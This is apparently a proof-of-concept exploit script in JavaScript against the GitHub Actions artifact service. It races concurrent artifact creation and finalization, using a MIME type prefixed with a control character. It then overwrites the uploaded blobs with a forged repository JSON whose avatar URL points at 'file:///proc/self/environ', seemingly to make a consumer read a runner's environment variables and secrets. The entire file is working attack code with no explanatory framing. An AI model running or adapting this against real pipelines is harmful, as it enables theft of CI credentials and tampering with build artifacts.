import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const odd = '\u0085application/json';
const repositoryName = process.env.GITHUB_REPOSITORY;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${artifactId}/zip`,
    owner: { login: 'x', avatar_url: 'file:///proc/self/environ' },
    description: '',
    stargazers_count: 0,
  }));
}

async function create(name, version, mime) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, version,
    mimeType: StringValue.create({ value: mime }),
  });
  if (!result.ok) throw new Error('create failed');
  return result;
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: odd },
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, size: String(bytes.length),
    hash: StringValue.create({ value: `sha256:${hash}` }),
  });
  if (!result.ok) throw new Error('finalize failed');
  return String(result.artifactId);
}

async function race(index) {
  const name = `cassette-race-${index}-${Date.now()}`;
  const reverse = index % 2 === 1;
  const specs = reverse
    ? [[7, 'application/json'], [6, odd]]
    : [[6, odd], [7, 'application/json']];
  const created = await Promise.all(specs.map(([version, mime]) => create(name, version, mime)));
  const placeholder = Buffer.from('{"x":"y"}');
  await Promise.all(created.map((item) => upload(item.signedUploadUrl, placeholder)));
  const finalized = await Promise.allSettled([finalize(name, placeholder), finalize(name, placeholder)]);
  const artifactIds = [...new Set(finalized.filter(r => r.status === 'fulfilled').map(r => r.value))];
  if (!artifactIds.length) throw new Error('no id');
  for (const artifactId of artifactIds) {
    await Promise.all(created.map((item) => upload(item.signedUploadUrl, payload(artifactId))));
  }
  return { name, artifactId: artifactIds.at(-1), artifactIds, reverse };
}

const results = [];
for (let index = 0; index < 32; index += 1) {
  try { results.push(await race(index)); } catch (e) { }
}
for (const r of results) console.log(`BUILT ${JSON.stringify(r)}`);
